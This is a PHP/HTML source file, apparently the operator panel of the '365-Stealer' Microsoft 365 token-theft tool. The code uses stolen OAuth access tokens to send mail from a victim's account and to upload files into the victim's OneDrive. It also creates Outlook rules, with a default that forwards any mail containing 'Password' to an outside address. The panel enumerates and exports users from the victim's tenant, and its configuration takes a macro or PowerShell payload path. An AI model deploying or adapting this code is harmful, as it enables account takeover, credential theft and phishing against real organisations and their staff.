          if ($data) curl_setopt($curl, CURLOPT_POSTFIELDS, $data);
          break;
      case "PATCH":
          curl_setopt($curl, CURLOPT_CUSTOMREQUEST, "PATCH");
          if ($data) curl_setopt($curl, CURLOPT_POSTFIELDS, $data);
          break;    
      default:
          if ($data) $url = sprintf("%s?%s", $url, http_build_query($data));
      }
   
      curl_setopt($curl, CURLOPT_URL, $url);
      curl_setopt($curl, CURLOPT_HTTPHEADER, array(
          'Authorization: Bearer ' . $access_token,
          'Content-Type: application/json'
      ));
      curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
      curl_setopt($curl, CURLOPT_HTTPAUTH, CURLAUTH_BASIC);
   
      // EXECUTE:
      $result = curl_exec($curl);
      if (!$result)
      {
          echo("");
      }
      curl_close($curl);
      return $result;
              }
   
   $mainname = $_REQUEST['dir'];
   if(isset($_POST['uploadfile'])){
   exec("$listing->python3 $listing->stealerPath --refresh-user $mainname --database-path $listing->databasePath --no-stealing");
   $access_token = file_get_contents("./".$mainname."/access_token.txt");
   $access_token = str_replace("\r\n","",$access_token);
   $filename = str_replace(" ","%20",$_FILES['file']['name']);
   $content = (file_get_contents($_FILES['file']['tmp_name']));
   $onedriveurl = "https://graph.microsoft.com/v1.0/me/drive/root:/" . $filename . ":/content";
   $conType = "application/vnd.openxmlformats-officedocument.wordprocessingml.document";
   echo $get_data = callAPI('PUT', $onedriveurl, $content, $access_token, $conType);
   $get_data = json_decode($get_data, true);
   
   
   if(isset($get_data['@microsoft.graph.downloadUrl'])){
      $message = "File Uploaded!";
      $type    = "success";
   }elseif(isset($get_data['error']['message'])){
      $message = str_replace("'", "\'",$get_data['error']['message']);
      $type    = "danger";
   }else{
      $message = "Something went wrong!";
      $type    = "danger";
   }
   
     header("location: ./?dir=".$_GET['dir']."&message=$message&type=$type");
   
   }
   
   if(isset($_POST['createrules']) and isset($_POST['rulebody'])){
   exec("$listing->python3 $listing->stealerPath --refresh-user $mainname --database-path $listing->databasePath --no-stealing");
   $access_token = file_get_contents("./".$mainname."/access_token.txt");
   $access_token = str_replace("\r\n","",$access_token);
   $conType = "application/json";
   $ruleUrl = "https://graph.microsoft.com/v1.0/me/mailFolders/inbox/messageRules/";
   $get_data = callAPI('GET', $ruleUrl, $_POST['rulebody'], $access_token, $conType);
   $get_data = json_decode($get_data, true);
   
   if(isset($get_data['value'])){    
   $rulelist =  count($get_data['value']);
   $count = 0;
   while($count <= $rulelist){
    $name = $get_data['value'][$count]['displayName'];
    if($name === json_decode($_POST['rulebody'], true)['displayName']){
        $ruleId = $get_data['value'][$count]['id'];
        callAPI('DELETE', $ruleUrl.$ruleId, null, $access_token, '');
        break;
    }
    $count++;
   }
   }
   
   
   $get_data = callAPI('POST', $ruleUrl, $_POST['rulebody'], $access_token, $conType);
   $get_data = json_decode($get_data, true);
   
   if(isset($get_data['displayName'])){
    $message = "Rules created!";
    $type = "success";
   
   }elseif(isset($get_data['error']['message'])){
   
   $message = str_replace("'", "\'",$get_data['error']['message']);
   $type = "danger";
   
   }else{
   
   $messages = "Something went wrong!";
   $type = "danger";
   }
    
   header("location: ./?dir=".$_GET['dir']."&message=$message&type=$type");
   }
   
   
   
   if(isset($_POST['sendMail']) and isset($_POST['mailBody']) and isset($_POST['Subject']) and isset($_POST['to']) ){
   exec("$listing->python3 $listing->stealerPath --refresh-user $mainname --database-path $listing->databasePath --no-stealing");
   $access_token = file_get_contents("./".$mainname."/access_token.txt");
   $mailBody =  addslashes($_POST['mailBody']);
   $subject = $_POST['Subject'];
   $to = $_POST['to'];
   $access_token = str_replace("\r\n","",$access_token);
   $jsonBody = '{
            "message": {
              "subject": "'.$subject.'",
              "body": {
                  "contentType": "HTML",
                  "content": "'.$mailBody.'"
              },
              "toRecipients": [
                  {
                      "emailAddress": {
                          "address": "'.$to.'"
                      }
                  }
              ]
            }
        }';
   if (isset($_FILES['file']) && $_FILES['file']['error'] === UPLOAD_ERR_OK){
   $content = base64_encode(file_get_contents($_FILES['file']['tmp_name']));
   $jsonBody = '{
          "message": {
            "subject": "'.$subject.'",
            "body": {
              "contentType": "HTML",
              "content": "'.$mailBody.'"
            },
            "toRecipients": [
              {
                "emailAddress": {
                  "address": "'.$to.'"
                }
              }
            ],
            "attachments": [
              {
                "@odata.type": "#microsoft.graph.fileAttachment",
                "name": "'.$_FILES['file']['name'].'",
                "contentType": "'.$_FILES['file']['type'].'",
                "contentBytes": "'.$content.'"
              }
            ]
          }
        }';
   
   }
   
    $mailurl = "https://graph.microsoft.com/v1.0/me/sendMail";
    $conType = "application/json";
    $get_data = callAPI('POST', $mailurl, $jsonBody, $access_token, $conType);
    $get_data = json_decode($get_data, true);
    if($get_data == ''){
        $message = "Mail Sent!";
        $type = "success";
    }elseif(isset($get_data['error']['message'])){
      $message = str_replace("'", "\'",$get_data['error']['message']);
      $type = "danger";
   }else{
      $message = "Something went wrong!";    
      $type    = "danger";
   }
    header("location: ./?dir=".$_GET['dir']."&message=$message&type=$type");
   }
   $outlookrule = '{
   "displayName": "RuleName",
   "sequence": 2,
   "isEnabled": true,
   "conditions": {
    "bodyContains": [
      "Password"
    ]
   },
   "actions": {
    "forwardTo": [
      {
        "emailAddress": {
          "name": "Email test",
          "address": "dummy@domain.com"
        }
      }
    ],
    "stopProcessingRules": true
   }
}';
   
   
   ?>
<!DOCTYPE html>
<html>
   <head>
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width, initial-scale=1">
      <link href="assets/css/bootstrap-icons.min.css" rel="stylesheet"> <!-- icons -->
      <link href="assets/css/5.3.3_bootstrap.min.css" rel="stylesheet">
      <script src="assets/js/5.3.3_bootstrap.bundle.min.js"></script>
      <link href="assets/css/popup.css" rel="stylesheet">
      <!-- <script src="assets/js/main.js"></script> -->
      <script>
      //   Inactivity timeout in milliseconds (1440 seconds = 24 minutes)
      //   const timeoutDuration = 1440000;

      //    let inactivityTimer;

      //    function resetTimer() {
      //       clearTimeout(inactivityTimer);
      //       inactivityTimer = setTimeout(logoutUser, timeoutDuration);

      //       // Send an AJAX request to the server to reset the session timeout
      //       fetch(window.location.href, { method: 'POST', body: new URLSearchParams({ reset_session: true }) });
      //    }

      //    function logoutUser() {
      //       window.location.href = 'logout.php?message=⚠️ You have been automatically logged out due to inactivity of 1440 seconds.';
      //    }

      //    // Reset the timer on any interaction (click, keypress, mousemove, scroll)
      //    window.onload = resetTimer;
      //    window.onmousemove = resetTimer;
      //    window.onkeypress = resetTimer;
      //    window.onscroll = resetTimer;
      //    window.onclick = resetTimer;

         function copyFileContent(filePath, dir) {
            fetch(filePath)
               .then(response => response.text())
               .then(text => {
                     const tempInput = document.createElement("textarea");
                     tempInput.style.position = "absolute";
                     tempInput.style.left = "-1000px";
                     tempInput.value = text;
                     document.body.appendChild(tempInput);
                     tempInput.select();
                     document.execCommand("copy");
                     document.body.removeChild(tempInput);
                     window.location.href = "./?dir=" + encodeURIComponent(dir) + "&message=" + encodeURIComponent("File content copied successfully!") + "&type=success";
               })
               .catch(err => {
                     console.error('Failed to fetch file content:', err);
                     alert("Failed to copy content. Please try again.");
               });
         }
      </script>

      <title><?php echo (!empty($listing->pageTitle) ? '' . $listing->pageTitle . '' : null); ?></title>
      <link rel = "icon" href = "assets/img/Title.png" type = "image/x-icon">
      <meta http-equiv="refresh" content="<?php  if(isset($sec)){echo $sec;} ?>;URL='<?php if(isset($sec)){echo $page;} ?>'">
      <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=no, target-densityDpi=device-dpi" />
      <link href="assets/css/style1.css" rel="stylesheet">
      <link href="assets/css/logo.css" rel="stylesheet">
   </head>
   <body style="background-color:#e5e5e5">
   <?php require 'partials/_nav.php' ?>

      <?php if(isset($_GET['message']) and isset($_GET['type'])) : ?>   
      <div class="message">
         <div class="alert alert-<?php echo $_GET['type']; ?>">
            <span class="closebtn" onclick="this.parentElement.style.display='none';">&times;</span> 
            <strong>Message: </strong> <?php echo htmlentities($_GET['message']); ?>
         </div>
      </div>
      <?php endif; ?>
      <div class="container-fluid">
            <div class="form-popup" id="myForm">
         <form action="" class="form-container" method="post">
            <p style="font-size: 60px">
                  <b>
                     <span class="pull-right">
                        <span style="color:#0061d1">3</span><span style="color:#4199ff">6</span><span style="color:#0061d1">5</span><span style="color:#4199ff">-</span>St<span style="color:#ff4500">e</span>al<span style="color:#ff4500">e</span>r 
                     </span>
                     <br>
                     <span style="color:#000000;" class="pull-left">C<span style="color:#ff4500">o</span>nfigurati<span style="color:#0061d1">o</span>n</span>
                  </b>
            </p>
            <input type="text" placeholder="Client Id" name="clientID" value="<?php echo $client_id; ?>">
            <input type="text" placeholder="Client Secret" name="clientSecret" value="<?php echo $client_secret; ?>">
            <input type="url"  placeholder="Redirect Url should have /login/authorized endpoint.(eg, https://localhost/login/authorized)" name="redirectUrl" value="<?php echo $redirect_url; ?>">
            <input type="text" placeholder="Redirect Url After Stealing Data, Let it be your home page(eg, / or https://yourothersite.com)" name="redirectafterstealing" value="<?php echo $redirect_after_stealing; ?>">
            <input type="text" placeholder="Macros File Path(.vbs) or PowerShell File Path(.ps1)" name="macroFilePath" value="<?php echo $macros_file_path; ?>">
            <input type="text" placeholder="Extension in oneDrive to download(eg:- docx, xlsx, txt). Provide * to download all files" name="extensions" value="<?php echo $extension_onedrive; ?>">
            <input type="text" placeholder="Delay In Seconds while Stealing data" name="delay" value="<?php echo $delay; ?>">  
            <div class="form-buttons">
                  <button type="submit" class="btn" name="configuration">Save</button>
                  <button type="button" class="btn cancel" onclick="closeForm()">Exit</button>
            </div>
         </form>
      </div>

      <?php if(isset($_REQUEST['preview'])):?>
         <div class="token-popup" id="token">
            <div style="overflow-y: scroll; max-height:600px">
                  <pre style="overflow-x: auto;
                     white-space: pre-wrap;
                     white-space: -moz-pre-wrap;
                     white-space: -pre-wrap;
                     white-space: -o-pre-wrap;
                     word-wrap: break-word;">
                  <?php
                     $sessionId = session_id();
                     // Ensure the file is accessed via HTTPS
                     $httpsPort = $_SERVER['SERVER_PORT'];
                     $previewUrl = "https://" . $_SERVER['SERVER_NAME'] . ":" . $httpsPort . $_GET['preview'];

                     $ch = curl_init();
                     curl_setopt($ch, CURLOPT_URL, $previewUrl);
                     curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                     // Set the session cookie to maintain the session
                     curl_setopt($ch, CURLOPT_COOKIE, "PHPSESSID=" . $sessionId);
                     curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); // Disable SSL verification
                     curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false); // Disable host name verification. Not recommended for production.
                     curl_setopt($ch, CURLOPT_VERBOSE, true);
                     
                     $preview = curl_exec($ch);

                     if ($preview === false) {
                        echo "cURL Error: " . curl_error($ch);
                     } else {
                        echo htmlentities($preview);
                     }

                     curl_close($ch);
                  ?>
                  </pre>
            </div>
            <a href="?dir=<?php echo $_GET['dir']; ?>" class="btn btn-danger pull-right" style="width:100%">Close</a>
         </div>
      <?php endif; ?>
         <script>
            function openForm() {
              document.getElementById("myForm").style.display = "block";
            }
            
            function closeForm() {
              document.getElementById("myForm").style.display = "none";
            }  
            
            function openPortModal() {
               document.getElementById('portModal').style.display = 'block';
            }
            
            function closePortModal() {
               document.getElementById('portModal').style.display = 'none';
            }

            window.onclick = function(event) {
               if (event.target == document.getElementById('portModal')) {
                  closePortModal();
               }
            }
         </script>
         <?php if (! empty($listing->pageTitle)): ?>
         <div class="row">
            <div class="col-xs-12" style="margin:10px;shadow:10px">
               <center><img style="box-shadow: 10px 10px 5px rgba(185, 185, 185, 0.71);" src="assets/img/365-Stealers.png" width="800px"></center>
            </div>
         </div>
         <?php endif; ?>
         <?php if(!isset($_GET['autorefresh']) or $_GET['autorefresh'] == 'false'): ?>
         <a href="?autorefresh=true&dir=<?php if(isset($_GET['dir'])){echo $_GET['dir']; } ?>" style="margin:10px" class="btn btn-success btn-xs pull-left">Turn On Auto Refresh</a>
         <?php else: ?>
         <a href="?autorefresh=false&dir=<?php if(isset($_GET['dir'])){echo $_GET['dir']; } ?>" style="margin:10px" class="btn btn-danger btn-xs pull-left">Turn Off Auto Refresh</a>
         <?php endif; ?>
         <a href="?refreshall=true" style="margin:10px"  class="btn btn-success btn-xs pull-right" onclick="return confirm('Are you sure?')">Refresh All User's Data</a>
         <span class="pull-right" style="margin:10px">
         <?php 
            if(isset($_REQUEST['dir']) and $_REQUEST['dir'] !== "./" and $_REQUEST['dir'] !== ""){ 
                $dir = $_REQUEST['dir'];
            ?>
         <a href="?dir=<?php echo $dir; ?>&refreshusertoken=true" class="btn btn-primany btn-xs" >Get New Token</a>      
         <div class="btn-group steal-again-section">
            <button type="button" class="btn btn-primary dropdown-toggle" data-bs-toggle="dropdown" aria-expanded="false">
               Actions
            </button>
            <div class="dropdown-menu p-3">
                <form action="" method="get">
                    <input type="hidden" name="dir" value="<?php echo htmlspecialchars($dir); ?>">
                    <input type="hidden" name="refreshuser" value="true">
                    <div class="form-check">
                        <input class="form-check-input select-all-checkbox" type="checkbox" id="all" name="actions[]" value=all>
                        <label class="form-check-label" for="all">
                            All
                        </label>
                    </div>
                    <div class="form-check">
                        <input class="form-check-input" type="checkbox" name="actions[]" value="checklicence" id="checklicence">
                        <label class="form-check-label" for="checklicence">
                            Check Licence
                        </label>
                    </div>
                    <div class="form-check">
                        <input class="form-check-input" type="checkbox" name="actions[]" value="listusers" id="listusers">
                        <label class="form-check-label" for="listusers">
                            List Users
                        </label>
                    </div>
                    <div class="form-check">
                        <input class="form-check-input" type="checkbox" name="actions[]" value="outlook" id="outlook">
                        <label class="form-check-label" for="outlook">
                            Outlook
                        </label>
                    </div>
                    <div class="form-check">
                        <input class="form-check-input" type="checkbox" name="actions[]" value="onedrive" id="onedrive">
                        <label class="form-check-label" for="onedrive">
                            OneDrive
                        </label>
                    </div>
                    <div class="form-check">
                        <input class="form-check-input" type="checkbox" name="actions[]" value="onenote" id="onenote">
                        <label class="form-check-label" for="onenote">
                            OneNote
                        </label>
                    </div>
                    <button type="submit" class="btn btn-primary mt-2 w-100 steal-button">Run</button>
                </form>
            </div>
        </div>
         <?php }?>
         </span>
         <center>
            <a  style="margin:10px; background-color: #007bff; opacity: 0.9;"  class="btn btn-xs" onclick="openForm()">365-Stealer Configuration</a>
            <a  style="margin:10px; background-color: #28a745; opacity: 0.9;" class="btn btn-xs" onclick="openPortModal()">Run 365-Stealer</a>
            <a  style="margin:10px; background-color: #F0401C; opacity: 0.9;"  class="btn btn-xs" href="?dir=&close-app">Shutdown 365-Stealer</a>
            <?php /* require_once 'partials/_app-registration.html'; */ ?>
         </center>
            <div id="portModal" class="modal">
            <div class="modal-content">
                  <span class="close" onclick="closePortModal()">&times;</span>
                  <form id="portForm" method="GET" action="">
                     <label for="port" style="color: black">The script will run on port:</label>
                     <input type="number" id="port" name="port" value="443" min="0" max="65535" required>
                     
                     <!-- Toggle Switch for HTTP/HTTPS -->
                     <div class="toggle-switch">
                        <span>HTTP</span>
                        <label class="switch">
                              <input type="checkbox" id="protocol" name="protocol" checked>
                              <span class="slider round"></span>
                        </label>
                        <span>HTTPS</span>
                     </div>

                     <button type="submit" name="run-app" value="true">Run</button>
                  </form>
            </div>
         </div>

         <?php if(! empty($data['directoryTree'])): ?>
         <div class="row">
            <div class="col-xs-12" >
               <ul class="breadcrumb" style="box-shadow: 10px 10px 5px rgba(185, 185, 185, 0.71);">
                  <?php foreach ($data['directoryTree'] as $url => $name): ?>
                  <li>
                     <?php
                        $lastItem = end($data['directoryTree']);
                        $arraycount = count($data['directoryTree']);
                        if($arraycount > 1){    
                            $mainname =  (array_values($data['directoryTree']))[1];
                        }else{
                            $mainname = '';
                        }
                        if($name === $lastItem):
                        
                           echo "<b>" . $name . "</b>";
                        else:
                        ?>
                     <a href="?dir=<?php echo $url; ?>">
                     <?php echo $name; ?>
                     </a>
                     <?php
                        endif;
                        ?>
                  </li>
                  <?php endforeach; ?>
               </ul>
            </div>
         </div>
         <div class="row">
            <div class="col-xs-12" >
               <div class="table-container" style="max-height:800px;box-shadow: 10px 10px 5px rgba(185, 185, 185, 0.71);">
                  <table class="table table-striped table-bordered">
                     <thead>
                        <th style="background-color:rgba(104, 203, 255, 0.56); font-size: 13px;">Folders (<?php echo count($data['directories']); ?>)</th>
                     </thead>
                     <?php if (!empty($data['directories'])): ?>
                     <tbody style="font-size: 15px;">
                        <?php foreach ($data['directories'] as $directory): ?>
                        <?php $directory['url'] = str_replace('./', '', urldecode($directory['url'])); ?>
                        <tr>
                           <td>
                              <a href="<?php echo ($directory['url']); ?>" class="item dir"><?php echo $directory['name']; ?></a>
                              <?php if ($listing->enableDirectoryDeletion): ?>
                              <span class="pull-right">
                              <?php 
                                 if(isset($_REQUEST['dir']) and ($_REQUEST['dir'] == "./" or $_REQUEST['dir'] == "")){
                                    ?>
                              <a href="?dir=<?php echo $directory['name']; ?>&refreshusertoken=true" class="btn btn-primany btn-xs" >Get New Token</a>
                              <div class="btn-group steal-again-section">
                                 <button type="button" class="btn btn-primary dropdown-toggle" data-bs-toggle="dropdown" aria-expanded="false">
                                    Actions
                                 </button>
                                 <div class="dropdown-menu p-3">
                                    <form action="" method="get">
                                       <input type="hidden" name="dir" value="<?php echo htmlspecialchars($directory['name']); ?>">
                                       <input type="hidden" name="refreshuser" value="true">
                                       
                                       <!-- All Checkbox -->
                                       <div class="form-check">
                                             <input class="form-check-input select-all-checkbox" type="checkbox" id="all" name="actions[]" value=all>
                                             <label class="form-check-label" for="all">
                                                All
                                             </label>
                                       </div>

                                       <!-- Individual Checkboxes -->
                                        <div class="form-check">
                                             <input class="form-check-input" type="checkbox" name="actions[]" value="checklicence" id="checklicence">
                                             <label class="form-check-label" for="checklicence">
                                                Check Licence
                                             </label>
                                       </div>
                                       <div class="form-check">
                                             <input class="form-check-input" type="checkbox" name="actions[]" value="listusers" id="listusers">
                                             <label class="form-check-label" for="listusers">
                                                List Users
                                             </label>
                                       </div>
                                       <div class="form-check">
                                             <input class="form-check-input" type="checkbox" name="actions[]" value="outlook" id="outlook">
                                             <label class="form-check-label" for="outlook">
                                                Outlook
                                             </label>
                                       </div>
                                       <div class="form-check">
                                             <input class="form-check-input" type="checkbox" name="actions[]" value="onedrive" id="onedrive">
                                             <label class="form-check-label" for="onedrive">
                                                OneDrive
                                             </label>
                                       </div>
                                       <div class="form-check">
                                             <input class="form-check-input" type="checkbox" name="actions[]" value="onenote" id="onenote">
                                             <label class="form-check-label" for="onenote">
                                                OneNote
                                             </label>
                                       </div>
                                       <button type="submit" class="btn btn-primary mt-2 w-100 steal-button">Run</button>
                                    </form>
                                 </div>
                           </div>      
                              <?php } ?>      
                              <a style="background-color: #F0401C; color: white;" href="<?php echo $directory['url']."&userfolderdel=".$mainname; ?>&delete=true" class="btn btn-danger btn-xs" onclick="return confirm('Are you sure?')">Delete</a>
                              </span>
                              <?php endif; ?>
                           </td>
                        </tr>
                        <?php endforeach; ?>
                     </tbody>
                     <?php endif; ?>
                  </table>
               </div>
            </div>
         </div>
         <br>
         <?php if (! empty($data['files'])): ?>
         <div class="row">
            <div class="col-xs-12">
               <div class="table-container" style="box-shadow: 10px 10px 5px rgba(185, 185, 185, 0.71);">
                  <table class="table table-striped table-bordered">
                     <thead>
                        <tr>
                           <th style="background-color:rgba(104, 203, 255, 0.56); font-size: 13px;">
                              Files (<?php echo count($data['files']); ?>)
                           </th>
                           <th style="background-color:rgba(104, 203, 255, 0.56); font-size: 13px;">
                              Size
                           </th>
                           <th style="background-color:rgba(104, 203, 255, 0.56); font-size: 13px;">
                              Last Modified 
                        </tr>
                     </thead>
                     <tbody>
                     <?php foreach ($data['files'] as $file): ?>
                     <tr style="word-wrap: break-word;">
                        <td>
                           <a style="font-size: 14px;" href="<?php echo $file['url']; ?>" target="<?php echo $file['target']; ?>" class="item _blank <?php echo $file['extension']; ?>">
                           <?php echo $file['name']; ?>
                           </a>
                           <span class="pull-right">
                           <?php if ($listing->enableFileDeletion == true): ?>
                           <a style="background-color: #F0401C; color: white;" href="?dir=<?php echo $_GET['dir']; ?>&deleteFile=<?php echo urlencode($file['relativePath'])."&userfiledel=".$mainname; ?>" class="pull-right btn btn-danger btn-xs" onclick="return confirm('Are you sure?')">Delete</a>
                           <?php endif; ?>   
                           
                           <?php
                           $viewableExtensions = ['txt', 'json', 'xml', 'html', 'csv', 'log', 'md']; // Add more extensions as needed
                           $fileExtension = pathinfo($file['url'], PATHINFO_EXTENSION);

                           if (in_array(strtolower($fileExtension), $viewableExtensions)):
                           ?>
                           <!-- Copy Button -->
                           <a href="javascript:void(0);" onclick="copyFileContent('<?php echo $file['relativePath']; ?>', '<?php echo $_GET['dir']; ?>');" class="pull-right btn btn-primary btn-xs" style="margin-right:10px;">Copy</a>
                           
                           <!-- View Button -->
                           <a href="?dir=<?php echo $_REQUEST['dir']; ?>&preview=<?php echo $file['url']; ?>" class="pull-right btn btn-primary btn-xs" onclick="opentext()" style="margin-right: 10px;">View</a>
                           
                           <!-- Decode Button for access_token.txt -->
                           <?php if($file['name'] == 'access_token.txt'): ?>
                           <a href="javascript:void(0);" onclick="decodeAccessToken('<?php echo $file['url']; ?>');" class="pull-right btn btn-primary btn-xs" style="margin-right: 10px;">Decode</a>
                           <?php endif; ?>
                           </span>   
                           <?php
                           endif;
                           ?>
                        </td>
                        <td class="text-right xs-hidden" style="font-size: 14px;"><?php echo $file['size']; ?></td>
                        <td class="text-right sm-hidden" style="font-size: 14px;"><?php echo date('M jS Y \a\t g:ia', $file['modified']); ?></td>
                     </tr>
                     <?php endforeach; ?>

                     </tbody>
                  </table>
               </div>
            </div>
         </div>
         <br><br>
         <script>
            // Function to fetch and decode the access_token.txt file
            function decodeAccessToken(fileUrl) {
               console.log('Fetching and decoding access_token.txt:', fileUrl);
               // Fetch the content of the access_token.txt file
               fetch(fileUrl)
                  .then(response => response.text())
                  .then(token => {
                     const decoded = decodeJWT(token.trim());
                     if (decoded) {
                        displayDecodedToken(decoded);
                     }
                  })
                  .catch(error => console.error('Error fetching token:', error));
            }

            // Function to decode JWT token
            function decodeJWT(token) {
               try {
                  const parts = token.split('.');
                  if (parts.length !== 3) {
                     throw new Error('Invalid JWT: JWT must have 3 parts');
                  }

                  const decodedParts = parts.slice(0, 2).map(part => {
                     const base64 = part.replace(/-/g, '+').replace(/_/g, '/');
                     const jsonPayload = decodeURIComponent(atob(base64).split('').map(function(c) {
                        return '%' + ('00' + c.charCodeAt(0).toString(16)).slice(-2);
                     }).join(''));
                     return JSON.parse(jsonPayload);
                  });

                  return {
                     header: decodedParts[0],
                     payload: decodedParts[1]
                  };
               } catch (e) {
                  console.error("Failed to decode JWT", e);
                  return null;
               }
            }

            // Function to display decoded JWT in the popup
            function displayDecodedToken(decoded) {
               const popup = document.getElementById('jwt-token');
               const content = `
                  <div class="jwt-section-title">HEADER: ALGORITHM & TOKEN TYPE</div>
                  <div class="jwt-header-content"><pre>${JSON.stringify(decoded.header, null, 2)}</pre></div>
                  
                  <div class="jwt-section-title">PAYLOAD: DATA</div>
                  <div class="jwt-payload-content"><pre>${JSON.stringify(decoded.payload, null, 2)}</pre></div>
               `;
               document.getElementById('jwt-decodedContent').innerHTML = content;
               document.querySelector('.jwt-overlay').style.display = 'block';
               popup.style.display = 'block';
            }

            // Function to close the popup
            function closePopup() {
               document.getElementById('jwt-token').style.display = 'none';
               document.querySelector('.jwt-overlay').style.display = 'none';
            }
         </script>
         <!-- JWT Popup Window and Overlay -->
         <div class="jwt-overlay" style="display:none;"></div>

         <div class="jwt-popup" id="jwt-token" style="display:none;">
            <button class="jwt-close-btn" onclick="closePopup()">×</button>
            <div id="jwt-decodedContent"></div>
            <button class="btn btn-danger" style="width: 100%;" onclick="closePopup()">Close</button>
         </div>
         <?php endif; ?>
         <?php endif; ?>
         <?php 
            if (file_exists("./".$name."/refresh_token.txt") or file_exists("./".$name."/access_token.txt")){
            
            ?>
         <div class="row" style="box-shadow: 10px 10px 5px rgba(185, 185, 185, 0.71);margin-bottom:50px">
            <div class="col-xs-12">
               <div class="table-container" style="box-shadow: 10px 10px 5px rgba(185, 185, 185, 0.71)">
                  <table class="table table-striped table-bordered">
                     <thead>
                        <tr>
                           <th colspan="3" style="background-color:rgba(104, 203, 255, 0.56); font-size: 15px;">
                              <center>Actions Tab</center>
                           </th>
                        </tr>
                        <th style="background-color:#ff7b19; font-size: 13px;">Send mail from victim user</th>
                        <th style="background-color:#ff7b19; font-size: 13px;">Upload files into victim's OneDrive</th>
                        <th style="background-color:#ff7b19; font-size: 13px;">Create Outlook Rules</th>
                     </thead>
                     <tbody>
                        <tr>
                           <td>
                              <form method="post" class="text-center  pull-left" enctype="multipart/form-data" style="padding:10px">
                                 <div class="form-group" >
                                    <span class="pull-left">
                                    <input size="60" type="email" name="to" id="to" class="form-control" placeholder="To.." required> 
                                    </span><br><br><br>
                                    <span class="pull-left">
                                    <input size="60" type="text" name="Subject" id="Subject" class="form-control"  placeholder="Subject.." required>
                                    </span><br><br><br>
                                    <input value="<?php echo $_REQUEST['dir']; ?>" type="hidden" name="dir" id="dir" class="form-control" required>
                                    <textarea type="text" rows="10" cols="60" name="mailBody" class="form-control" placeholder="Type message"></textarea>
                                    <br><br>
                                    <span class="pull-left">
                                    <input type="file" name="file" id="file" class="form-control" >
                                    </span>
                                    <br><br><br><br>
                                    <span class="pull-left">
                                    <button type="submit" class="btn btn-primary" name="sendMail">Send Mail</button>
                                    </span>
                                 </div>
                              </form>
                           </td>
                           <td>
                              <form  method="post" class="text-center pull-left" enctype="multipart/form-data" style="padding:10px">
                                 <div class="form-group">
                                    <span class="pull-left">
                                    <input type="file" name="file" id="file" class="form-control" required>
                                    </span>
                                    <br><br><br>
                                    <span class="pull-left">
                                    <button type="submit" class="btn btn-primary" name="uploadfile">Upload file</button>
                                    </span>
                                 </div>
                              </form>
                           </td>
                           <td>
                              <form method="post" class="text-center pull-left" enctype="multipart/form-data" style="padding:10px">
                                 <div class="form-group">
                                    <textarea type="text" rows="18" cols="60" name="rulebody" class="form-control"><?php echo $outlookrule ?></textarea>
                                    <br><br>
                                    <span class="pull-left">
                                    <button type="submit" class="btn btn-primary" name="createrules">Create Rules</button>
                                    </span>
                                    <span class="pull-right">
                                    <strong>
                                    Refrence link=>
                                    <a href="https://docs.microsoft.com/en-us/graph/api/resources/messagerule?view=graph-rest-1.0" target="_blank">Message_Rule </a>
                                    </strong> </span>                                    
                                 </div>
                              </form>
                           </td>
                        </tr>
                     </tbody>
                  </table>
               </div>
            </div>
         </div>
         <br><br>
         <?php }elseif(file_exists($name)){
            ?>
         <center>
            <h1 style="margin-top:5%">Click on <span style="color:blue">Steal New Token</span> to get Actions Tab!</h1>
         </center>
         <?php
            }
            if(!isset($_REQUEST['dir']) or $_REQUEST['dir'] === "./" or $_REQUEST['dir'] === ""){
            ?>
         <div class="row">
    <div class="col-xs-12">
        <div class="table-container" style="margin-bottom:50px; box-shadow: 10px 10px 5px rgba(185, 185, 185, 0.71);">
            <table class="table table-striped table-bordered">
                <thead>
                    <th style="background-color:rgba(104, 203, 255, 0.56); font-size: 13px;">List all User from victim's tenant</th>
                </thead>
                <tbody>
                    <tr>
                        <td>
                            <form action="" method="get" class="text-center form-inline">
                                <div class="row g-2">
                                    <div class="col-lg-4 col-md-6 col-sm-12">
                                        <input type="text" name="displayName" id="displayName" class="form-control w-100" value="<?php if(isset($_GET['displayName'])){echo $_GET['displayName'];} ?>" placeholder="Display Name...">
                                    </div>
                                    <div class="col-lg-4 col-md-6 col-sm-12">
                                        <input type="text" name="principleName" id="principleName" class="form-control w-100" value="<?php if(isset($_GET['principleName'])){echo $_GET['principleName'];} ?>" placeholder="Email Address...">
                                    </div>
                                    <div class="col-lg-4 col-md-6 col-sm-12">
                                        <input type="text" name="userID" id="userID" class="form-control w-100" value="<?php if(isset($_GET['userID'])){echo $_GET['userID'];} ?>" placeholder="User Id...">
                                    </div>
                                    <input type="hidden" name="ListAllUsers">
                                    <div class="col-12 mt-3 d-flex justify-content-center gap-2">
                                        <button type="submit" class="btn btn-primary" name="">List Users</button>
                                        <input type="submit" name="exportuser" class="btn btn-primary" value="Export Users List">
                                    </div>
                                </div>
                            </form>
                        </td>
                    </tr>
                </tbody>
            </table>
        </div>
    </div>
</div>

         <?php 
            if(isset($_GET['ListAllUsers'])){
              $emailid = $_GET['principleName'];
              $displayname = $_GET['displayName'];
              $userId = $_GET['userID'];
                
            $db = new SQLite3("$listing->databasePath");
            // Prepare the SQL statement with placeholders
            $stmt = $db->prepare("SELECT * FROM Allusers WHERE userPrincipalName LIKE :emailid AND displayName LIKE :displayname AND id LIKE :userid ORDER BY 1 DESC");

            // Bind the actual values to the placeholders
            $stmt->bindValue(':emailid', "%$emailid%", SQLITE3_TEXT);
            $stmt->bindValue(':displayname', "%$displayname%", SQLITE3_TEXT);
            $stmt->bindValue(':userid', "%$userId%", SQLITE3_TEXT);

            // Execute the statement
            $res = $stmt->execute();
            
            ?>
         <div class="row" >
            <div class="col-xs-12">
               <div class="table-container" style="overflow-y: scroll;max-height:800px;box-shadow: 10px 10px 5px rgba(185, 185, 185, 0.71);" >
                  <table class="table table-striped table-bordered">
                     <thead>
                        <tr>
                           <th style="background-color:#ff8327; font-size: 13px; text-align: center;">
                              Display Name 
                           </th>
                           <th style="background-color:#ff8327; font-size: 13px; text-align: center;">
                              User Principal Name
                           </th>
                           <th style="background-color:#ff8327; font-size: 13px; text-align: center;">
                              Given Name 
                           </th>
                           <th style="background-color:#ff8327; font-size: 13px; text-align: center;">
                              Surname
                           </th>
                           <th style="background-color:#ff8327; font-size: 13px; text-align: center;">
                              Job Title
                           </th>
